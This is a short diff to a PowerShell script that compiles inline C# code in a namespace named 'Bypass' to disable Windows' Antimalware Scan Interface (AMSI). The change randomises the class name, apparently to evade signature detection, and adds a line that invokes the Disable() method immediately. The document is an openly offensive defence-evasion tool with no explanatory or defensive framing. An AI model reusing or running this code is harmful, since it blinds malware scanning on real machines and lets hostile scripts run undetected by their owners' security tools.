@@ -1,4 +1,6 @@
-﻿$Ref = (
+﻿$id = get-random
+ 
+$Ref = (
 "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
 "System.Runtime.InteropServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
 )
@@ -9,7 +11,7 @@ using System.Runtime.InteropServices;
 
 namespace Bypass
 {
-    public class AMSI
+    public class AMSI$id
     {
         [DllImport("kernel32")]
         public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
@@ -46,3 +48,4 @@ namespace Bypass
 "@
 
 Add-Type -ReferencedAssemblies $Ref -TypeDefinition $Source -Language CSharp
+iex "[Bypass.AMSI$id]::Disable()"
